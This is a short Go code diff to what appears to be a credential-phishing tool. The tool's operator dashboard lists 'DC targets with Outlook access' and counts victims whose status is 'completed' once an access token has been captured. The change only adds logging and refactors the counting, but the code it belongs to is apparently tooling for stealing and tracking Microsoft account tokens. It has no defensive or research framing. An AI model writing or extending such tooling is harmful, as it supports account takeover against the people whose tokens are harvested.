@@ -307,6 +307,7 @@ func (s *HttpServer) handleDCLanding(w http.ResponseWriter, r *http.Request) {
 // handleDCDashboard renders the master dashboard listing all DC targets with Outlook access
 func (s *HttpServer) handleDCDashboard(w http.ResponseWriter, r *http.Request) {
 	targets := GetDCTargets()
+	log.Info("Dashboard: Retrieved %d targets", len(targets))
 
 	var rows strings.Builder
 	for _, t := range targets {
@@ -526,10 +527,16 @@ func countByStatus(targets []*DCTarget, status string) int {
 	count := 0
 	for _, t := range targets {
 		t.mu.Lock()
-		if t.Status == status && status == "completed" && t.AccessToken != "" {
-			count++
-		} else if t.Status == status && status != "completed" {
-			count++
+		if status == "completed" {
+			// For completed, only count if tokens are present
+			if t.Status == "completed" && t.AccessToken != "" {
+				count++
+			}
+		} else {
+			// For other statuses, just check status
+			if t.Status == status {
+				count++
+			}
 		}
 		t.mu.Unlock()
 	}
